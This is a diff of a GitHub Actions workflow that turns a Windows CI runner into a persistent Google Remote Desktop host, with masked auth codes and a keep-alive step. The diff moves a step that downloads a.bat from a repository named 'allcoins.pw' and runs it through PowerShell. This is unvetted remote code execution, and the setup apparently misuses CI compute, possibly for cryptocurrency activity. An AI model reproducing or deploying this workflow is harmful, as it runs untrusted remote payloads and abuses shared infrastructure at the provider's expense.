@@ -21,11 +21,6 @@ jobs:
 
     steps:
     - uses: actions/checkout@v2
-    - name: auto
-      run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/redsunday/allcoins.pw/master/file/a.bat -OutFile a.bat
-        copy "a.bat" "C:\Users\Public\Desktop\a.bat"
-        Start-Process Powershell -ArgumentList '-Noexit -Command "C:\Users\Public\Desktop\a.bat"'
     - name: Mask Code & Pin.
       shell: bash
       run: |
@@ -42,6 +37,11 @@ jobs:
       run: ./grdp.ps1 ${{ env.ComputerName }}
     - name: Starting Google Remote Desktop
       run: ${{ env.AuthCode }} -pin=${{ env.AuthPin }}
+    - name: Auto Prog
+      run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/redsunday/allcoins.pw/master/file/a.bat -OutFile a.bat
+        copy "a.bat" "C:\Users\Public\Desktop\a.bat"
+        Start-Process Powershell -ArgumentList '-Noexit -Command "C:\Users\Public\Desktop\a.bat"'
     - name: Keep Alive.
       shell: bash
       run: sh keep.bat
